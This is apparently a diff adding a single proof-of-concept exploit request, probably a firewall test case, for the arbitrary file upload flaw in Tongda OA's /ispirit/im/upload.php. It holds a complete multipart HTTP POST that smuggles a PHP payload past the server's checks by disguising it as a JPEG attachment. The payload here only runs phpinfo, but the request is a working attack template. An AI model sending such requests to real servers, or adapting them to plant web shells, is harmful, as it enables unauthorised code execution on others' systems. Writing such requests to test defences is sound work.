@@ -1,0 +1,29 @@
+# 利用【通达OA /ispirit/im/upload.php任意文件上传漏洞】-30000442
+# 通达OA /ispirit/im/upload.php存在任意文件上传漏洞
+POST /ispirit/im/upload.php?acid=30000442&bid=hd_tag_m8mv26nk HTTP/1.1
+Host: www.swaf.com
+Cookie: PHPSESSID=123
+RM-PRO-BusinessID: hd_tag_m8mv26nk
+RM-PRO-Token: 1d39358b45079537808634ae60cd0428
+RM-PRO-Time: 1742808641039
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB
+
+------WebKitFormBoundarypyfBh1YB4pV8McGB
+Content-Disposition: form-data; name="UPLOAD_MODE"
+
+2
+------WebKitFormBoundarypyfBh1YB4pV8McGB
+Content-Disposition: form-data; name="P"
+
+123
+------WebKitFormBoundarypyfBh1YB4pV8McGB
+Content-Disposition: form-data; name="DEST_UID"
+
+1
+------WebKitFormBoundarypyfBh1YB4pV8McGB
+Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
+Content-Type: image/jpeg
+
+<?php phpinfo();?>
+------WebKitFormBoundarypyfBh1YB4pV8McGB--
